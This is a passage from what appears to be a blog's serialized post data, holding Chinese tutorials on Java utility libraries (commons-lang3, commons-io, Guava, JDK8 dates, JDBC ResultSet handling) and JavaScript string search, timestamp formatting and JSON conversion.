</ version > \n </ dependency > \n \n 1 2 3 4 5 commons-lang 有两个版本，一个是  commons-lang3 ，一个是 commons-lang 。\ncommons-lang 是老版本，已经很久没有维护了。\ncommons-lang3 是一直在维护的版本，推荐直接使用这个版本。\n注意：如果你系统已经有 commons-lang，注意如果直接替换成 commons-lang3，将会编译错误。commons-lang3 中相关类与 commons-lang 一样，但是包名不一样。 \n 判断字符串是否为空 \n 判断字符串是否为空，想必每个人应该都写过吧： \n if   ( null   ==  str  ||  str . isEmpty ( ) )   { \n\n } \n\n \n 1 2 3 4 虽然这段代码非常简单，但是说实话，小黑哥以前还是在这里犯过空指针的异常的。 \n 使用 StringUtils ，上面代码可以替换下面这样： \n if   ( StringUtils . isEmpty ( str ) )   { \n\n } \n \n 1 2 3 StringUtils  内部还有一个方法 isBlank，也是用来判断字符串是否为空，两个方法比较相近，比较搞混，主要区别如下： \n // 如果字符串都是空格的话， \n StringUtils . isBlank ( " " )         =   true ; \n StringUtils . isEmpty ( " " )         =   false ；\n \n 1 2 3 判断字符串是否为空，使用频率非常高，这里大家可以使用 IDEA Prefix 的功能，输入直接生成判空语句。 \n 字符串固定长度 \n 这个通常用于字符串需要固定长度的场景，比如需要固定长度字符串作为流水号，若流水号长度不足，，左边补 0 。\n这里当然可以使用 String#format 方法，不过小黑哥觉得比较麻烦，这里可以这样使用： \n // 字符串固定长度 8位，若不足，忘左补 0 \n StringUtils . leftPad ( "test" ,   8 ,   "0" ) ; \n \n 1 2 另外还有一个 StringUtils#rightPad,这个方法与上面方法正好相反。 \n 字符串关键字替换 \n StringUtils 提供一些列的方法，可以替换某些关键字： \n // 默认替换所有关键字 \n StringUtils . replace ( "aba" ,   "a" ,   "z" )     =   "zbz" ; \n // 替换关键字，仅替换一次 \n StringUtils . replaceOnce ( "aba" ,   "a" ,   "z" )     =   "zba" ; \n // 使用正则表达式替换 \n StringUtils . replacePattern ( "ABCabc123" ,   "[^A-Z0-9]+" ,   "" )     =   "ABC123" ；\n . . . . \n \n 1 2 3 4 5 6 7 #  字符串拼接 \n 字符串拼接是个常见的需求，简单办法使用 StringBuilder 循环遍历拼接： \n String [ ]  array  =   new   String [ ] { "test" ,   "1234" ,   "5678" } ; \n StringBuilder  stringBuilder  =   new   StringBuilder ( ) ; \n\n for   ( String  s  :  array )   { \n    stringBuilder . append ( s ) . append ( ";" ) ; \n } \n // 防止最终拼接字符串为空 \n if   ( stringBuilder . length ( )   >   0 )   { \n    stringBuilder . deleteCharAt ( stringBuilder . length ( )   -   1 ) ; \n } \n System . out . println ( stringBuilder . toString ( ) ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 上面业务代码不太难，但是需要注意一下上面这段代码非常容易出错，容易抛出 StringIndexOutOfBoundsException。\n这里我们可以直接使用以下方法获取拼接之后字符串： \n StringUtils . join ( [ "a" ,   "b" ,   "c" ] ,   "," )      =   "a,b,c" \n \n 1 StringUtils 只能传入数组拼接字符串，不过我比较喜欢集合拼接，所以再推荐下 Guava 的 Joiner。\n实例代码如下： \n String [ ]  array  =   new   String [ ] { "test" ,   "1234" ,   "5678" } ; \n List < String >  list = new   ArrayList < > ( ) ; \nlist . add ( "test" ) ; \nlist . add ( "1234" ) ; \nlist . add ( "5678" ) ; \n StringUtils . join ( array ,   "," ) ; \n\n // 逗号分隔符，跳过 null \n Joiner  joiner = Joiner . on ( "," ) . skipNulls ( ) ; \njoiner . join ( array ) ; \njoiner . join ( list ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 #  字符串拆分 \n 有字符串拼接，就会有拆分字符串的需求，同样的 StringUtils 也有拆分字符串的方法。 \n StringUtils . split ( "a..b.c" ,   \'.\' )     =   [ "a" ,   "b" ,   "c" ] \n StringUtils . splitByWholeSeparatorPreserveAllTokens ( "a..b.c" ,   "." ) =   [ "a" , "" ,   "b" ,   "c" ] \n \n 1 2 ps:注意以上两个方法区别。 \n StringUtils 拆分之后得到是一个数组，我们可以使用 Guava 的 \n Splitter  splitter  =   Splitter . on ( "," ) ; \n // 返回是一个 List 集合，结果：[ab, , b, c] \nsplitter . splitToList ( "ab,,b,c" ) ; \n // 忽略空字符串，输出结果 [ab, b, c] \nsplitter . omitEmptyStrings ( ) . splitToList ( "ab,,b,c" ) \n \n 1 2 3 4 5 StringUtils 内部还有其他常用的方法，小伙伴可以自行查看其 API。 \n 日期相关工具类 \n DateUtils/DateFormatUtils \n JDK8 之前，Java 只提供一个 Date 类，平常我们需要将 Date 按照一定格式转化成字符串，我们需要使用 SimpleDateFormat。 \n SimpleDateFormat  simpleDateFormat = new   SimpleDateFormat ( "yyyy-MM-dd HH:mm:ss" ) ; \n // Date 转 字符串 \nsimpleDateFormat . format ( new   Date ( ) ) ; \n // 字符串 转 Date \nsimpleDateFormat . parse ( "2020-05-07 22:00:00" ) ; \n \n 1 2 3 4 5 代码虽然简单，但是这里需要注意 SimpleDateFormat，不是线程安全的，多线程环境一定要注意使用安全。\n这里小黑哥推荐  commons-lang3 下的时间工具类DateUtils/DateFormatUtils,解决 Date 与字符串转化问题。 \n ps:吐槽一下，你们工程中有没有多个叫 DateUtils 类？小黑哥发现我们现有工程，多个模块有提供这个类，每个实现大同小异。\n \n 使用方法非常简单： \n // Date 转化为字符串 \n DateFormatUtils . format ( new   Date ( ) , "yyyy-MM-dd HH:mm:ss" ) ; \n // 字符串 转 Date \n DateUtils . parseDate ( "2020-05-07 22:00:00" , "yyyy-MM-dd HH:mm:ss" ) ; \n \n 1 2 3 4 除了格式转化之外，DateUtils 还提供时间计算的相关功能。 \n Date  now  =   new   Date ( ) ; \n // Date 加 1 天 \n Date  addDays  =   DateUtils . addDays ( now ,   1 ) ; \n // Date 加 33 分钟 \n Date  addMinutes  =   DateUtils . addMinutes ( now ,   33 ) ; \n // Date 减去 233 秒 \n Date  addSeconds  =   DateUtils . addSeconds ( now ,   - 233 ) ; \n // 判断是否 Wie 同一天 \n boolean  sameDay  =   DateUtils . isSameDay ( addDays ,  addMinutes ) ; \n // 过滤时分秒,若 now 为 2020-05-07 22:13:00 调用 truncate 方法以后 \n // 返回时间为 2020-05-07 00:00:00 \n Date  truncate  =   DateUtils . truncate ( now ,   Calendar . DATE ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  JDK8 时间类 \n JDK8 之后，Java 将日期与时间分为 LocalDate，LocalTime，功能定义更加清晰，当然其也提供一个 LocalDateTime，包含日期与时间。这些类相对于 Date 类优点在于，这些类与 String 类一样都是不变类型，不但线程安全，而且不能修改。 \n ps：仔细对比 mysql 时间日期类型 DATE，TIME，DATETIME，有没有感觉差不多\n \n 现在 mybatis 等 ORM 框架已经支持 LocalDate 与 JDBC 时间类型转化，所以大家可以直接将时间字段实际类型定义为 JDK8 时间类型，然后再进行相关转化。\n如果依然使用的是 Date 类型，如果需要使用新的时间类型，我们需要进行相关转化。两者之间进行转化， 稍微复杂一点，我们需要显示指定当前时区。 \n Date  now  =   new   Date ( ) ; \n // Date-----\x3e LocalDateTime 这里指定使用当前系统默认时区 \n LocalDateTime  localDateTime  =  now . toInstant ( ) . atZone ( ZoneId . systemDefault ( ) ) . toLocalDateTime ( ) ; \n // LocalDateTime------\x3e Date 这里指定使用当前系统默认时区 \n Date  date  =   Date . from ( localDateTime . atZone ( ZoneId . systemDefault ( ) ) . toInstant ( ) ) ; \n \n 1 2 3 4 5 接下来我们使用 LocalDateTime 进行字符串格式化。 \n // 按照 yyyy-MM-dd HH:mm:ss 转化时间 \n LocalDateTime  dateTime  =   LocalDateTime . parse ( "2020-05-07 22:34:00" ,   DateTimeFormatter . ofPattern ( "yyyy-MM-dd HH:mm:ss" ) ) ; \n // 将 LocalDateTime 格式化字符串 \n String  format  =   DateTimeFormatter . ofPattern ( "yyyy-MM-dd HH:mm:ss" ) . format ( dateTime ) ; \n \n 1 2 3 4 另外我们使用 LocalDateTime 获取当前时间年份，月份特别简单： \n LocalDateTime  now  =   LocalDateTime . now ( ) ; \n // 年 \n int  year  =  now . getYear ( ) ; \n // 月 \n int  month  =  now . getMonthValue ( ) ; \n // 日 \n int  day  =  now . getDayOfMonth ( ) ; \n \n 1 2 3 4 5 6 7 最后我们还可以使用 LocalDateTime 进行日期加减，获取下一天的时间： \n LocalDateTime  now  =   LocalDateTime . now ( ) ; \n // 当前时间加一天 \n LocalDateTime  plusDays  =  now . plusDays ( 1l ) ; \n // 当前时间减一个小时 \n LocalDateTime  minusHours  =  now . minusHours ( 1l ) ; \n // 还有很多其他方法 \n \n 1 2 3 4 5 6 总之 JDK8 提供的时间类非常好用，还没用过小伙伴，可以尝试下。 \n 集合/数组相关 \n 集合与数组我们日常也需要经常使用，也需要对其进行判空： \n if   ( null   ==  list  ||  list . isEmpty ( ) )   { \n\n } \n \n 1 2 3 ps: 数组、Map 集合与其类似\n \n 上面代码如字符串判空一样写起来都非常简单，但是也比较容易写出会抛出空指针异常的代码。这里我们可以使用 commons-collections 提供工具类。\npom 信息： \n < dependency > \n     < groupId > org.apache.commons </ groupId > \n     < artifactId > commons-collections4 </ artifactId > \n     < version > 4.4 </ vesion > \n </ dependency > \n \n 1 2 3 4 5 ps: 还有一个低版本的 ，artifactId 为 commons-collections\n \n 我们可以使用 CollectionUtils/MapUtils进行判空判断。 \n // List/Set 集合判空 \n if ( CollectionUtils . isEmpty ( list ) ) { \n\n } \n\n // Map 等集合进行判空 \n if   ( MapUtils . isEmpty ( map ) )   { \n\n } \n \n 1 2 3 4 5 6 7 8 9 至于数组判空判断需要使用 commons-lang 下的 ArrayUtils进行判断: \n // 数组判空 \n if   ( ArrayUtils . isEmpty ( array ) )   { \n\n } \n \n 1 2 3 4 除此之外还有一些列的对于集合增强方法，比如快速将数组加入到现有集合中： \n List < String >  listA  =   new   ArrayList < > ( ) ; \nlistA . add ( "1" ) ; \nlistA . add ( "2" ) ; \nlistA . add ( "3" ) ; \n String [ ]  arrays  =   new   String [ ] { "a" ,   "b" ,   "c" } ; \n CollectionUtils . addAll ( listA ,  arrays ) ; \n \n 1 2 3 4 5 6 其他方法感兴趣同学可以再自行研究下，另外 Guava 中也有提供对于集合的操作增强类 Lists/Maps,这个可以看下小黑哥之前写的： 老司机小黑哥带你玩转 Guava 集合类 。 \n I/O 相关 \n JDK 有提供一系列的类可以读取文件等，不过小黑哥觉得那些类有些晦涩难懂，实现一个小功能可能还要写好多代码，而且还不一定能写对。\n小黑哥推荐一下 Apache 提供的 commons-io 库，增强 I/O 操作，简化操作难度。pom 信息： \n < dependency > \n     < groupId > commons-io </ groupId > \n     < artifactId > commons-io </ artifactId > \n     < version > 2.6 </ version > \n </ dependency > \n \n 1 2 3 4 5 #  FileUtils-文件操作工具类 \n 文件操作工具类提供一系列方法，可以让我们快速读取写入文件。\n快速实现文件/文件夹拷贝操作 ,FileUtils.copyDirectory/FileUtils.copyFile \n // 拷贝文件 \n File  fileA  =   new   File ( "E:\\\\test\\\\test.txt" ) ; \n File  fileB  =   new   File ( "E:\\\\test1\\\\test.txt" ) ; \n FileUtils . copyFile ( fileA , fileB ) ; \n \n 1 2 3 4 使用 FileUtils.listFiles 获取指定文件夹上所有文件 \n // 按照指定文件后缀如java,txt等去查找指定文件夹的文件 \n File  directory  =   new   File ( "E:\\\\test" ) ; \n FileUtils . listFiles ( directory ,   new   String [ ] { "txt" } ,   false ) ; \n \n 1 2 3 使用 FileUtils.readLines 读取该文件所有行。 \n // 读取指定文件所有行 不需要使用 while 循环读取流了 \n List < String >  lines  =   FileUtils . readLines ( file ,   "UTF-8" ) ; \n \n 1 2 有读就存在写，可以使用 FileUtils.writeLines，直接将集合中数据，批量写入文本。 \n // 可以批量写入文本 \n File  file  =   new   File ( "E:\\\\test" ) ; \n List < String >  lines  =   new   ArrayList < > ( ) ; \n . . . . . \n FileUtils . writeLines ( file ,   "UTF-8" ,  lines ) ; \n \n 1 2 3 4 5 #  特殊需求：FileUtils/IOUtils中写入文本的方法看上去都是只能一次性的批量写入多行，并覆盖原有的文本，如果我们需要追加写入怎么办呢。 \n 其实在IOUtils中是提供了这样的方法的 \n File  file  =   new   File ( "E:\\\\test" ) ; \n OutputStream  os  =   new   FileOutputStream ( file ,   true ) ; \n IOUtils . writeLines ( lines ,   null ,  os ,   "UTF-8" ) ; \n \n 1 2 3 其实就是在初始化FileOutputStream的时候 ，第二个参数append设为true就可以了。 \n IOUtils-I/O 操作相关工具类 \n 读取文件 \n List < String >  lines  =   IOUtils . readLines ( new   FileInputStream ( file ) ,   "UTF-8" ) ; \n \n 1 写文件 \n IOUtils . writeLines ( lines ,   null ,   new   FileOutputStream ( file ) ) ; \n \n 1 FileUtils 主要针对相关文件操作，IOUtils 更加针对底层 I/O,可以快速读取 InputStream。实际上 FileUtils 底层操作依赖就是 IOUtils。\nIOUtils可以适用于一个比较试用的场景，比如支付场景下，HTTP 异步通知场景。如果我们使用 JDK 原生方法写: \n 从 Servlet 获取异步通知内容\n \n byte [ ]  b  =   null ; \n ByteArrayOutputStream  baos  =   null ; \n String  respMsg  =   null ; \n try   { \n     byte [ ]  buffer  =   new   byte [ 1024 ] ; \n    baos  =   new   ByteArrayOutputStream ( ) ; \n     // 获取输入流 \n     InputStream  in  =  request . getInputStream ( ) ; \n     for   ( int  len  =   0 ;   ( len  =  in . read ( buffer ) )   >   0 ;   )   { \n        baos . write ( buffer ,   0 ,  len ) ; \n     } \n    b  =  baos . toByteArray ( ) ; \n    baos . close ( ) ; \n     // 字节数组转化成字符串 \n     String  reqMessage  =   new   String ( b ,   "utf-8" ) ; \n }   catch   ( IOException  e )   { \n\n }   finally   { \n     if   ( baos  !=   null )   { \n         try   { \n            baos . close ( ) ; \n         }   catch   ( IOException  e )   { \n\n         } \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 上面代码说起来还是挺复杂的。不过我们使用 IOUtils，一个方法就可以简单搞定： \n // 将输入流信息全部输出到字节数组中 \n byte [ ]  b  =   IOUtils . toByteArray ( request . getInputStream ( ) ) ; \n // 将输入流信息转化为字符串 \n String  resMsg  =   IOUtils . toString ( request . getInputStream ( ) ) ; \n \n 1 2 3 4 ps: InputStream 不能被重复读取\n 计时 \n 编程中有时需要统计代码的的执行耗时，当然执行代码非常简单，结束时间与开始时间相减即可。 \n long  start  =   System . currentTimeMillis ( ) ;     //获取开始时间 \n\n //其他代码 \n //... \n long  end  =   System . currentTimeMillis ( ) ;   //获取结束时间 \n\n System . out . println ( "程序运行时间： "   +   ( end  -  start )   +   "ms" ) ; \n \n 1 2 3 4 5 6 7 虽然代码很简单，但是非常不灵活，默认情况我们只能获取 ms 单位，如果需要转换为秒，分钟，就需要另外再计算。\n这里我们介绍 Guava Stopwatch 计时工具类，借助他统计程序执行时间，使用方式非常灵活。 \n commons-lang3 与 Spring-core 也有这个工具类，使用方式大同小异，大家根据情况选择。 \n // 创建之后立刻计时，若想主动开始计时 \n Stopwatch  stopwatch  =   Stopwatch . createStarted ( ) ; \n // 创建计时器，但是需要主动调用 start 方法开始计时 \n // Stopwatch stopwatch = Stopwatch.createUnstarted(); \n // stopWatch.start(); \n // 模拟其他代码耗时 \n TimeUnit . SECONDS . sleep ( 2L ) ; \n\n // 当前已经消耗的时间 \n System . out . println ( stopwatch . elapsed ( TimeUnit . SECONDS ) ) ; ; \n\n TimeUnit . SECONDS . sleep ( 2L ) ; \n\n // 停止计时 未开始的计时器调用 stop 将会抛错 IllegalStateException \nstopwatch . stop ( ) ; \n // 再次统计总耗时 \n System . out . println ( stopwatch . elapsed ( TimeUnit . SECONDS ) ) ; ; \n // 重新开始，将会在原来时间基础计算，若想重新从 0开始计算，需要调用 stopwatch.reset() \nstopwatch . start ( ) ; \n TimeUnit . SECONDS . sleep ( 2L ) ; \n System . out . println ( stopwatch . elapsed ( TimeUnit . SECONDS ) ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 输出结果为： \n 2\n4\n6\n \n 1 2 3 #  总结 \n 今天介绍了字符串、日期、数组/集合、I/O、计时等工具类，简化日常业务代码。大家看完可以尝试一下，不得不说，这些工具类真香！ \n'},{title:"resolve java.lang.NoClassDefFoundError: javax/xml/bind/JAXBException",frontmatter:{title:"resolve java.lang.NoClassDefFoundError: javax/xml/bind/JAXBException",date:"2021-09-25 22:41:22",tags:["java"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java_resolve-java-problem.html",relativePath:"blogs/java/java_resolve-java-problem.md",key:"v-6a16cd8a",path:"/blogs/java/java_resolve-java-problem.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" add the following to pom.xml. \n < dependency > \n     < groupId > javax.xml.bind </ groupId > \n     < artifactId > jaxb-api </ artifactId > \n     < version > 2.3.1 </ version > \n </ dependency > \n \n 1 2 3 4 5 "},{title:"Java将ResultSet结果集遍历到List中",frontmatter:{title:"Java将ResultSet结果集遍历到List中",date:"2021-09-25 21:27:19",tags:["java","jdbc","ResultSet","hive"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java_traversal_ResultSet.html",relativePath:"blogs/java/java_traversal_ResultSet.md",key:"v-c1514bd6",path:"/blogs/java/java_traversal_ResultSet.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 在正常情况下，我们是不能直接将 ResultSet 记录集 rs 直接传递给前台的，因为 ResultSet 不仅无法进行循环遍历 （即只能每行遍历，从0至end ，执行一次），而且在实际应用中，它还必须被关闭。当关闭后，rs为null ,结果不再存在。\n在这时我们就需要将 ResultSet 对象进行遍历到 list 中。 \n 以java 连接 hive 为例 \n      /**\n     * jdbc 连接 hive\n     * \n     * @return\n     * @throws ClassNotFoundException\n     * @throws SQLException\n     */ \n     private   static   List < Map < String ,   Object > >   connectToHive ( )   throws   ClassNotFoundException ,   SQLException   { \n         String  url  =   "jdbc:hive2://110.40.137.191:10000/testdb" ; \n         String  driver  =   "org.apache.hive.jdbc.HiveDriver" ; \n         String  username  =   "" ; \n         String  password  =   "" ; \n         String  sql  =   "select * from employee" ; \n         Connection  connection  =   null ; \n         Class . forName ( driver ) ; \n        connection  =   DriverManager . getConnection ( url ,  username ,  password ) ; \n         // Statement statement = connection.createStatement(); \n         // ResultSet resultSet = statement.executeQuery(sql); \n\n         PreparedStatement  pstmt  =  connection . prepareStatement ( sql ) ; \n         // pstmt.setInt(1, 1); \n         // pstmt.setString(2, "2"); \n         // 将ResultSet结果集遍历到List中 \n         ResultSet  resultSet  =  pstmt . executeQuery ( ) ; \n         List < Map < String ,   Object > >  resultList  =   convertList ( resultSet ) ; \n        resultSet . close ( ) ; \n        pstmt . close ( ) ; \n        connection . close ( ) ; \n         return  resultList ; \n     } \n\n     /**\n     * 将ResultSet结果集遍历到List中\n     * \n     * @param rs\n     * @return\n     * @throws SQLException\n     */ \n     private   static   List < Map < String ,   Object > >   convertList ( ResultSet  rs )   throws   SQLException   { \n         List < Map < String ,   Object > >  list  =   new   ArrayList < > ( ) ; \n         ResultSetMetaData  md  =  rs . getMetaData ( ) ; // 获取键名 \n         int  columnCount  =  md . getColumnCount ( ) ; // 获取行的数量 \n         while   ( rs . next ( ) )   { \n             Map < String ,   Object >  rowData  =   new   HashMap < > ( ) ; // 声明Map \n             for   ( int  i  =   1 ;  i  <=  columnCount ;  i ++ )   { \n                rowData . put ( md . getColumnName ( i ) ,  rs . getObject ( i ) ) ; // 获取键名及值 \n             } \n            list . add ( rowData ) ; \n         } \n         return  list ; \n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 '},{title:"用js实现模糊查询的几种方法",frontmatter:{title:"用js实现模糊查询的几种方法",date:"2021-05-23T17:35:08.000Z",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javaScript_oynVguj0l.html",relativePath:"blogs/javascript/javaScript_oynVguj0l.md",key:"v-010f5256",path:"/blogs/javascript/javaScript_oynVguj0l.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" \n indexof 方法 \n \n 语法：stringObject.indexOf(searchvalue, fromindex)\n \n 1 参数：searchvalue 必需。规定需检索的字符串值。 fromindex 可选的整数参数。规定在字符串中开始检索的位置。它的合法取值是 0 到 stringObject.length - 1。如省略该参数，则将从字符串的首字符开始检索。\n \n 1 说明：该方法将从头到尾地检索字符串 stringObject，看它是否含有子串 searchvalue。开始检索的位置在字符串的 fromindex 处或字符串的开头（没有指定 fromindex 时）。如果找到一个 searchvalue，则返回 searchvalue 的第一次出现的位置。stringObject 中的字符位置是从 0 开始的。如果没有找到，将返回 -1。\n \n 1 /**\n   * 使用indexof方法实现模糊查询\n   * @param  {Array}  list     进行查询的数组\n   * @param  {String} keyWord  查询的关键词\n   * @return {Array}           查询的结果\n   */ \n   function   fuzzyQuery ( list ,  keyWord )   { \n     var  arr  =   [ ] ; \n     for   ( var  i  =   0 ;  i  <  list . length ;  i ++ )   { \n       if   ( list [ i ] . indexOf ( keyWord )   >=   0 )   { \n        arr . push ( list [ i ] ) ; \n       } \n     } \n     return  arr ; \n   } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \n split 方法 \n \n 语法：stringObject.split(separator, howmany)\n \n 1 参数：separator 必需。字符串或正则表达式，从该参数指定的地方分割 stringObject。howmany 可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。\n \n 1 说明：该方法通过在 separator 指定的边界处将字符串 stringObject 分割成子串并返回子串数组。返回的数组中的字串不包括 separator 自身。如果 stringObject 中不存在 separator，将返回一个只包含stringObject的数组。故可以根据返回数组的长度来判断是否存在子字符串 separator 。\n \n 1    /**\n   * 使用spilt方法实现模糊查询\n   * @param  {Array}  list     进行查询的数组\n   * @param  {String} keyWord  查询的关键词\n   * @return {Array}           查询的结果\n   */ \n   function   fuzzyQuery ( list ,  keyWord )   { \n     var  arr  =   [ ] ; \n     for   ( var  i  =   0 ;  i  <  list . length ;  i ++ )   { \n       if   ( list [ i ] . split ( keyWord ) . length  >   1 )   { \n        arr . push ( list [ i ] ) ; \n       } \n     } \n     return  arr ; \n   } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \n match 方法 \n \n 语法：stringObject.match(searchvalue) 或 stringObject.match(regexp)\n \n 1 参数：searchvalue 必需。规定要检索的字符串值。regexp 必需。规定要匹配的模式的 RegExp 对象。如果该参数不是 RegExp 对象，则需要首先把它传递给 RegExp 构造函数，将其转换为 RegExp 对象。\n \n 1 说明：该方法将在字符串 stringObject 内检索指定的值，或找到一个或多个正则表达式的匹配。如果没有找到任何匹配的文本，将返回 null 。否则，它将返回一个数组，其中存放了与它找到的匹配文本有关的信息。\n \n 1 /**\n   * 使用match方法实现模糊查询\n   * @param  {Array}  list     进行查询的数组\n   * @param  {String} keyWord  查询的关键词\n   * @return {Array}           查询的结果\n   */ \n   function   fuzzyQuery ( list ,  keyWord )   { \n     var  arr  =   [ ] ; \n     for   ( var  i  =   0 ;  i  <  list . length ;  i ++ )   { \n       if   ( list [ i ] . match ( keyWord )   !=   null )   { \n        arr . push ( list [ i ] ) ; \n       } \n     } \n     return  arr ; \n   } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \n test方法（正则匹配） \n \n 语法：RegExpObject.test(string)\n \n 1 参数：string 必需。要检测的字符串。\n \n 1 说明：该方法用于检测一个字符串是否匹配某个模式。如果字符串 string 中含有与 RegExpObject 匹配的文本，则返回 true，否则返回 false。\n \n 1   /**\n * 使用test方法实现模糊查询\n * @param  {Array}  list     原数组\n * @param  {String} keyWord  查询的关键词\n * @return {Array}           查询的结果\n */ \n function   fuzzyQuery ( list ,  keyWord )   { \n   var  reg  =    new   RegExp ( keyWord ) ; \n   var  arr  =   [ ] ; \n   for   ( var  i  =   0 ;  i  <  list . length ;  i ++ )   { \n     if   ( reg . test ( list [ i ] ) )   { \n      arr . push ( list [ i ] ) ; \n     } \n   } \n   return  arr ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #  性能测试 \n 测试条件：一个长度为100的数组，每个方法测试50次，取平均值。\nindexof 方法耗费时间： 0.048ms\nsplit 方法耗费时间： 0.037ms\nmatch 方法耗费时间： 0.178ms\ntest 方法耗费时间： 0.039ms\n 结论 \n \n \n 从上面测试结果可以看出在几百几千甚至几万条数据量的情况下，前端去处理都是没问题的，相比发送一个 ajax 请求去后台来说，前端还是具有很大优势的，能节省不少时间。 \n \n \n 相比其他方法，match 方法性能最差，消耗的时间差不多是其他方法的3-4倍，虽说这一点点时间相比发送ajax来说，也算提高了很多既然我们在一开始就是为了提高用户体验，那么我们也应该追求极致啦，所以 match 选手落败。 \n \n \n 除了 match 方法，其他三个方法在性能上差不多。不过在这里有一点需要提出的就是， test 方法因为使用到了正则表达式，所以能够实现的功能会比较强大，写出来的代码也更加简洁。打个比方，在不区分大小写的模糊搜索条件下， test 方法只需在正则表达式中添加修饰符 i 即可实现不区分大小写，而 indexof 方法和 split 方法则要通过多次的方法调用和逻辑运算符才能实现效果。 \n \n \n"},{title:"JS实现时间戳转时间格式",frontmatter:{title:"JS实现时间戳转时间格式",date:"2021-08-29T09:50:14.000Z",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript-data-format.html",relativePath:"blogs/javascript/javascript-data-format.md",key:"v-ac60ddd6",path:"/blogs/javascript/javascript-data-format.html",headers:[{level:2,title:"老方法",slug:"老方法"},{level:2,title:"新思路",slug:"新思路"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 老方法 \n 平常用的基本是这个方法，用Date方法依次将年月日时分秒一个个算出来，然后拼接成需要的时间格式字符串。 \n function   frontOneHour   ( fmt )   { \n     var  currentTime  =   new   Date ( new   Date ( ) . getTime ( ) ) \n    console . log ( currentTime )   // Wed Jun 20 2018 16:12:12 GMT+0800 (中国标准时间) \n     var  o  =   { \n       'M+' :  currentTime . getMonth ( )   +   1 ,   // 月份 \n       'd+' :  currentTime . getDate ( ) ,   // 日 \n       'h+' :  currentTime . getHours ( ) ,   // 小时 \n       'm+' :  currentTime . getMinutes ( ) ,   // 分 \n       's+' :  currentTime . getSeconds ( ) ,   // 秒 \n       'q+' :  Math . floor ( ( currentTime . getMonth ( )   +   3 )   /   3 ) ,   // 季度 \n       'S' :  currentTime . getMilliseconds ( )   // 毫秒 \n     } \n     if   ( / (y+) / . test ( fmt ) )  fmt  =  fmt . replace ( RegExp . $ 1 ,   ( currentTime . getFullYear ( )   +   '' ) . substr ( 4   -  RegExp . $ 1. length ) ) \n     for   ( var  k  in  o )   { \n       if   ( new   RegExp ( '('   +  k  +   ')' ) . test ( fmt ) )  fmt  =  fmt . replace ( RegExp . $ 1 ,   ( RegExp . $ 1. length  ===   1 )   ?   ( o [ k ] )   :   ( ( '00'   +  o [ k ] ) . substr ( ( ''   +  o [ k ] ) . length ) ) ) \n     } \n     return  fmt\n   } \n // 调用 \n frontOneHour ( 'yyyy-MM-dd hh:mm:ss' ) \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #  新思路 \n 为了将时间戳转换为我们需要的时间格式，我们写了两个函数，加起来十几行。前段时间，部门大佬告知了另外一种方式，一行代码完成时间戳转换为‘YYYY-MM-DD HH:mm:ss:sss’形式的时间格式，顿时代码精简了很多，话不多说，亮出代码 \n const  convertTime  =   ( time =   + new   Date ( ) )   =>   new   Date ( time  +   8   *   3600   *   1000 ) . toJSON ( ) . substr ( 0 ,   19 ) . replace ( 'T' ,   ' ' ) . replace ( / - / g ,   '-' ) \n convertTime ( ) \n convertTime ( 1641871698565 ) \n convertTime ( 1594197632   *   1000 ) \n \n 1 2 3 4 Date的‘toJSON’方法返回格林威治时间的JSON格式字符串，实际是使用‘toISOString’方法的结果。字符串形如‘2018-08-09T10:20:54.396Z’，转化为北京时间需要额外增加八个时区，我们需要取字符串前19位，然后把‘T’替换为空格，即是我们需要的时间格式。 \n 把时间格式中的‘-’修改为‘.’或者其他符号都是可以的。对比老方法，这种方法代码量比以前省了不止一星半点的，读起来也简洁多了。如果时间格式需要毫秒数，只需要获取前23位字符串，和上面一样用replace方法替换。 \n"},{title:"JavaScript 对象与 JSON 对象的相互转换",frontmatter:{title:"JavaScript 对象与 JSON 对象的相互转换",date:"2021-05-10T17:10:23.000Z",tags:["JavaScript","json"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript-dui-xiang-yu-json-dui-xiang-de-xiang-hu-zhuan-huan.html",relativePath:"blogs/javascript/javascript-dui-xiang-yu-json-dui-xiang-de-xiang-hu-zhuan-huan.md",key:"v-d04da692",path:"/blogs/javascript/javascript-dui-xiang-yu-json-dui-xiang-de-xiang-hu-zhuan-huan.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 一、全局JSON对象 \n ES5定义了全局对象JSON，对解析JSON的行为制定了规范。\nJSON对象有两个方法：stringify() 和 parse()。 \n 二、JavaScript 对象序列化为 JSON对象 \n JSON.stringify( js对象 [, 过滤器] [, 选项])\n二三参数可选，js对象中的函数和原型成员将被忽略，值为undefined的属性也被跳过。\n默认情况下，返回的JSON不包含任何空格字符和缩进。 \n var  book  =   { \n            title :   "Professional JavaScript" , \n            authors :   [ "Nicholas C. Zakas" ] , \n            edition :   3 , \n            year :   2011 \n            } ; \n \n var  jsonText  =   JSON . stringify ( book ) ; \n \n 1 2 